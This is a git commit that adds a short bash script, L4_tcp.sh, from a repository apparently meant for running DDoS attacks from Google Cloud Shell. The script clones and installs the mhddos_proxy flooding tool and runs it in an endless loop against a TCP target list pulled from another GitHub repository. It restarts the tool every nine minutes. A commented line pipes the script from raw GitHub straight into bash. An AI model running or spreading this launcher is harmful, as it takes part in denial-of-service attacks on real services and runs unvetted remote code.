fbd5c4456c0a096b4c913544ec144e283e03e28e
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-30 12:34:14 +0300

    Create L4_tcp.sh

---
+++ L4_tcp.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
+rm -rf mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+while true
+do
+   pkill -f runner.py
+   sleep 5
+   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst -t 300 --rpc 200 --debug
+sleep 9m
+done
